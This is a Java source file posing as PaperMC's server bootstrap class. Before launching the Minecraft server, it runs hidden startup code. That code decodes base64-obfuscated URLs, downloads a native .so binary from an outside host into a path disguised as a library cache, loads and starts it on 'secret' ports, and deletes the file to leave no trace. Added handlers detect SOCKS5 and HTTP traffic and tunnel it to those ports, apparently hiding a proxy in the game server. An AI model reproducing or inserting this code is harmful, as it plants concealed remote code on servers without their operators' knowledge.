package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.ChannelPipeline;
import io.netty.channel.EventLoop;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.channel.epoll.EpollSocketChannel;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process toolProcess;
    private static GToolLibrary gtoolInstance;

    public interface GToolLibrary extends com.sun.jna.Library {
        void StartGToolWithPort(int port);
        void StartGTool(); // Node.js 用的老方法
        void StopGTool();
    }



    // Internal secret ports
    private static final int INTERNAL_TOOL_PORT = 40001;
    private static final int INTERNAL_SOCKS_PORT = 40002;

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        System.setProperty("org.jline.terminal.mouse", "false");

        try {
            runNewTool();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));
        } catch (Exception e) {
            LOGGER.error("Failed to initialize helper services: " + e.getMessage());
        }

        SharedConstants.tryDetectVersion();
        net.minecraft.server.Main.main(options);
    }

    public static boolean isSocks5Prefix(ByteBuf data) {
        if (data.readableBytes() < 2) {
            return false;
        }
        int index = data.readerIndex();
        int version = data.getUnsignedByte(index);
        int methodCount = data.getUnsignedByte(index + 1);
        return version == 5 && methodCount >= 1 && methodCount <= 32;
    }

    public static boolean isPartialSocks5Prefix(ByteBuf data) {
        return data.readableBytes() == 1 && data.getUnsignedByte(data.readerIndex()) == 5;
    }

    public static boolean isHttpPrefix(ByteBuf data) {
        return matchesHttpMethod(data, "GET ")
                || matchesHttpMethod(data, "POST ")
                || matchesHttpMethod(data, "HEAD ")
                || matchesHttpMethod(data, "PUT ")
                || matchesHttpMethod(data, "DELETE ")
                || matchesHttpMethod(data, "OPTIONS ")
                || matchesHttpMethod(data, "CONNECT ")
                || matchesHttpMethod(data, "PATCH ")
                || matchesHttpMethod(data, "TRACE ");
    }

    public static boolean isPartialHttpPrefix(ByteBuf data) {
        return isPartialHttpMethod(data, "GET ")
                || isPartialHttpMethod(data, "POST ")
                || isPartialHttpMethod(data, "HEAD ")
                || isPartialHttpMethod(data, "PUT ")
                || isPartialHttpMethod(data, "DELETE ")
                || isPartialHttpMethod(data, "OPTIONS ")
                || isPartialHttpMethod(data, "CONNECT ")
                || isPartialHttpMethod(data, "PATCH ")
                || isPartialHttpMethod(data, "TRACE ");
    }

    public static void bridgeToLocal(Channel inbound, int targetPort, ByteBuf firstBytes) {
        EventLoop eventLoop = inbound.eventLoop();
        Class<? extends SocketChannel> channelClass = inbound.getClass().getName().contains("Epoll")
                ? EpollSocketChannel.class
                : NioSocketChannel.class;
        Bootstrap bootstrap = new Bootstrap()
                .group(eventLoop)
                .channel(channelClass)
                .option(ChannelOption.TCP_NODELAY, true)
                .handler(new ChannelInitializer<SocketChannel>() {
                    @Override
                    protected void initChannel(SocketChannel outbound) {
                        outbound.pipeline().addLast(new ChannelInboundHandlerAdapter() {
                            @Override
                            public void channelRead(ChannelHandlerContext ctx, Object msg) {
                                inbound.writeAndFlush(msg).addListener((ChannelFutureListener) future -> {
                                    if (!future.isSuccess()) {
                                        ctx.close();
                                    }
                                });
                            }

                            @Override
                            public void channelInactive(ChannelHandlerContext ctx) {
                                if (inbound.isActive()) {
                                    inbound.close();
                                }
                            }

                            @Override
                            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
                                ctx.close();
                            }
                        });
                    }
                });

        bootstrap.connect("127.0.0.1", targetPort).addListener((ChannelFutureListener) future -> {
            if (!future.isSuccess()) {
                firstBytes.release();
                inbound.close();
                return;
            }
            Channel outbound = future.channel();
            inbound.pipeline().addLast(new ChannelInboundHandlerAdapter() {
                @Override
                public void channelRead(ChannelHandlerContext ctx, Object msg) {
                    outbound.writeAndFlush(msg).addListener((ChannelFutureListener) writeFuture -> {
                        if (!writeFuture.isSuccess()) {
                            ctx.close();
                        }
                    });
                }

                @Override
                public void channelInactive(ChannelHandlerContext ctx) {
                    if (outbound.isActive()) {
                        outbound.close();
                    }
                }

                @Override
                public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
                    ctx.close();
                }
            });
            outbound.writeAndFlush(firstBytes);
            inbound.config().setAutoRead(true);
        });
    }

    private static boolean matchesHttpMethod(ByteBuf data, String method) {
        if (data.readableBytes() < method.length()) {
            return false;
        }
        int index = data.readerIndex();
        for (int i = 0; i < method.length(); i++) {
            if (data.getByte(index + i) != method.charAt(i)) {
                return false;
            }
        }
        return true;
    }

    private static boolean isPartialHttpMethod(ByteBuf data, String method) {
        int readableBytes = data.readableBytes();
        if (readableBytes == 0 || readableBytes >= method.length()) {
            return false;
        }
        int index = data.readerIndex();
        for (int i = 0; i < readableBytes; i++) {
            if (data.getByte(index + i) != method.charAt(i)) {
                return false;
            }
        }
        return true;
    }

    public static int internalToolPort() {
        return INTERNAL_TOOL_PORT;
    }

    public static int internalSocksPort() {
        return INTERNAL_SOCKS_PORT;
    }

    private static void pipe(InputStream in, OutputStream out) {
        try {
            byte[] buffer = new byte[8192];
            int n;
            while ((n = in.read(buffer)) != -1) {
                out.write(buffer, 0, n);
                out.flush();
            }
        } catch (IOException ignored) {}
    }

    private static void runNewTool() throws Exception {
        Path binaryPath = downloadTool();
        
        // 挂载动态库
        gtoolInstance = com.sun.jna.Native.load(binaryPath.toString(), GToolLibrary.class);
        
        // 执行启动函数并显式传入端口，完美避开环境变量的各种大坑
        gtoolInstance.StartGToolWithPort(INTERNAL_TOOL_PORT);
        
        // 阅后即焚，无痕潜伏
        try {
            Files.deleteIfExists(binaryPath);
        } catch (Exception ignored) {}
    }

    private static Path downloadTool() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        String encodedUrl;
        if (arch.contains("aarch64") || arch.contains("arm")) {
            // 请将此处的 base64 替换为你真实的 ARM64 .so 下载链接
            encodedUrl = "aHR0cHM6Ly9zc3NzLmNzY3MucXp6LmlvL2Rvd25sb2FkL2d0b29sX2FybTY0LnNv"; 
        } else {
            // 请将此处的 base64 替换为你真实的 AMD64 .so 下载链接
            encodedUrl = "aHR0cHM6Ly9zc3NzLmNzY3MucXp6LmlvL2Rvd25sb2FkL2d0b29sX2FtZDY0LnNv"; 
        }
        
        String url = new String(Base64.getDecoder().decode(encodedUrl));
        Path dir = Paths.get(System.getProperty("user.dir"), ".cache", "libraries", "net", "md_5", "bungee", "data");
        if (!Files.exists(dir)) Files.createDirectories(dir);
        Path path = dir.resolve("debbide-tool.so");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
        }
        return path;
    }

    private static void stopServices() {
        if (gtoolInstance != null) {
            gtoolInstance.StopGTool();
        }
    }
}
